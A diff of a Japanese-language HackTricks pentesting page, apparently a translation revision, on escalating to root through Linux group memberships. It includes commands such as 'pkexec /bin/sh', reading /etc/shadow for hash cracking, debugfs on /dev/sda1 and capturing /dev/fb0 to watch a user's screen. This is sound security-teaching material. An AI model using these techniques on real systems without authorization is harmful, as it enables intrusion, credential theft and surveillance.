@@ -1,9 +1,8 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-
 # Sudo/Admin グループ
 
-## **PE - 方法 1**
+## **PE - メソッド 1**
 
 **時々**、**デフォルトで（またはいくつかのソフトウェアが必要とするために）** **/etc/sudoers** ファイル内にこれらの行のいくつかを見つけることができます：
 ```bash
@@ -15,13 +14,13 @@
 ```
 これは、**sudoまたはadminグループに属する任意のユーザーがsudoとして何でも実行できる**ことを意味します。
 
-この場合、**rootになるには、単に次を実行すればよい**:
+この場合、**rootになるには次のように実行するだけです**:
 ```text
 sudo su
 ```
 ## PE - Method 2
 
-すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるか確認します:
+すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるかどうかを確認します:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
@@ -29,13 +28,13 @@ find / -perm -4000 2>/dev/null
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-そこでは、どのグループが**pkexec**を実行することを許可されているか、そして**デフォルトで**いくつかのLinuxでは**sudoやadmin**のグループが**表示される**可能性があるかを見つけることができます。
+そこでは、どのグループが**pkexec**を実行することを許可されているか、そして**デフォルトで**いくつかのLinuxに**sudoやadmin**のグループが**表示される**かを見つけることができます。
 
 **rootになるには、次のコマンドを実行できます**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-**pkexec**を実行しようとすると、次の**エラー**が表示されます:
+**pkexec**を実行しようとしたときにこの**エラー**が表示される場合：
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
@@ -70,13 +69,13 @@ sudo su
 ```text
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-だから、ファイルを読み、いくつかの**ハッシュをクラッキング**してみてください。
+そうですね、ファイルを読んでいくつかの**ハッシュをクラッキング**してみてください。
 
 # ディスクグループ
 
 この特権はほぼ**ルートアクセスと同等**であり、マシン内のすべてのデータにアクセスできます。
 
-ファイル:`/dev/sd[a-z][1-9]`
+ファイル: `/dev/sd[a-z][1-9]`
 ```text
 debugfs /dev/sda1
 debugfs: cd /root
@@ -101,7 +100,7 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 **tty1**は、ユーザー**yossiが物理的に**マシンのターミナルにログインしていることを意味します。
 
-**videoグループ**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。そのためには、**画面上の現在の画像を生データで取得**し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
+**videoグループ**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。それを行うためには、**画面上の現在の画像を生データで取得**し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存され、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
